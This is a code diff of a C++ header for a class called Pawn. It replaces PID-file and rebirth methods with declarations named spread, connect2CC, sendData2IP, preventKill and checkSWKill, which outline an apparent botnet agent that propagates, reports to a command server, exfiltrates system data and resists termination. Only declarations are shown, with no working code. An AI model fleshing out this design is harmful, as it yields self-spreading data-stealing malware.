@@ -11,7 +11,6 @@
 
 
 class Pawn {
-    pid_t currentPID;
 
 public:
     SystemDataCollector systemData;
@@ -19,15 +18,13 @@ public:
     Pawn();
     ~Pawn();
 
-    int needReborn();
-    int sendMyselfData();
-    int readPidFile(std::string fname);
-    void born();
-    void reborn();
+    bool sendMySelfData();
+    bool spread();
     void doWork();
-    void pidToFile(std::string fname);
-    void rmPidFile(std::string fname);
-
+    bool checkSWKill();
+    bool connect2CC();
+    bool sendData2IP();
+    void preventKill();
 };
 
 
